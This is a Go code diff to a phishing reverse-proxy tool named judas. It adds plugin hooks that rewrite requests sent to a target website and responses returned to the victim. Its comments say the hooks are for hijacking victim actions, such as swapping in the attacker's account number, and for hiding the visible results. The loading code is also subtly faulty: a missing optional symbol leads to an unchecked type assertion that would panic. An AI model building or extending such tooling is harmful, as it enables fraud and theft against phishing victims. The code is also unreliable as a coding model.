@@ -3,14 +3,28 @@ package judas
 import (
 	"context"
 	"log"
+	"net/http"
 	"net/url"
 	"plugin"
+	"strings"
 )
 
 // InitializerFunc is a go function that should be exported by a function package.
 // It should be named "New".
 // Your InitializerFunc should return an instance of your Plugin with a reference to judas's logger for consistent logging.
 type InitializerFunc func(*log.Logger) (Plugin, error)
+
+// RequestTransformer modifies a request before it is sent to the target website.
+// This can be used to hijack victim actions, like replacing an account number with ours.
+// Delays in this function will slow down the phishing site for the victim.
+// Your RequestTransformer should be a function called "RequestTransformer"
+type RequestTransformer func(*http.Request) error
+
+// ResponseTransformer modifies a response before it is returned to the victim.
+// You can use ResponseTransformers to hide any visible results of a RequestTransformer.
+// Delays in this function will slow down the phishing site for the victim.
+// Your ResponseTransformer should be a function called "ResponseTranformer"
+type ResponseTransformer func(*http.Response) error
 
 // PluginBroker handles sending messages to plugins.
 type PluginBroker struct {
@@ -86,10 +100,28 @@ func LoadPlugins(logger *log.Logger, paths []string) (*PluginBroker, error) {
 			return nil, err
 		}
 
+		symbol, err = plg.Lookup("RequestTransformer")
+		if err != nil {
+			if optionalPluginError(err) {
+				return nil, err
+			}
+		}
+		requestTransformer := symbol.(func(*http.Request) error)
+
+		symbol, err = plg.Lookup("ResponseTransformer")
+		if err != nil {
+			if optionalPluginError(err) {
+				return nil, err
+			}
+		}
+		responseTransformer := symbol.(func(*http.Response) error)
+
 		input := make(chan *HTTPExchange)
 		httpfuzzPlugin := &pluginInfo{
-			Input:  input,
-			Plugin: judasPlugin,
+			Input:               input,
+			Plugin:              judasPlugin,
+			RequestTransformer:  requestTransformer,
+			ResponseTransformer: responseTransformer,
 		}
 
 		// Listen for results in a goroutine for each plugin
@@ -100,14 +132,20 @@ func LoadPlugins(logger *log.Logger, paths []string) (*PluginBroker, error) {
 	return broker, nil
 }
 
+func optionalPluginError(err error) bool {
+	return !strings.Contains(err.Error(), "could not find symbol")
+}
+
 // Plugin implementations will be given a stream of HTTPExchanges to let plugins capture valuable information out of request-response transactions.
 type Plugin interface {
 	Listen(<-chan *HTTPExchange)
 }
 
 type pluginInfo struct {
-	Input chan<- *HTTPExchange
 	Plugin
+	Input               chan<- *HTTPExchange
+	RequestTransformer  RequestTransformer
+	ResponseTransformer ResponseTransformer
 }
 
 // HTTPExchange contains the request sent by the user to us and the response received from the target server.
